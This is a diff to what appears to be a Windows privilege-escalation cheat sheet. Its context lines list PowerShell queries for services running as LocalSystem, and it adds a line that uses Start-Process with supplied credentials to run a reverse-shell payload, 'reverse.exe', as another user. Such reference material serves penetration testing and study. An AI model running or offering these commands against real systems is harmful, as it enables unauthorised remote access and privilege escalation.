@@ -1272,6 +1272,9 @@ Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Ob
 Get-CimInstance -ClassName Win32_Service | Where-Object {$_.StartMode -eq 'Auto' -and $_.State -eq 'Running' -and $_.StartName -eq 'LocalSystem'} | Select-Object Name,StartName,StartMode,State,PathName
 Get-CimInstance -ClassName Win32_Service | Where-Object {$_.StartMode -eq 'Manual' -and $_.State -eq 'Stopped' -and $_.StartName -eq 'LocalSystem'} | Select-Object Name,StartName,StartMode,State,PathName
 Get-CimInstance -ClassName Win32_Service | Where-Object {$_.StartMode -eq 'Manual' -and $_.State -eq 'Stopped' -and $_.StartName -eq 'LocalSystem' -and $_.PathName -notlike '*svchost.exe*'} | Select-Object Name,StartName,StartMode,State,PathName
+
+#Run as another user
+Start-Process 'C:\Windows\System32\cmd.exe' -Credential $cred -WorkingDirectory 'C:\Windows\Temp' -ArgumentList '/c C:\Users\Public\reverse.exe'
 ```
 
 ## Automated Scripts
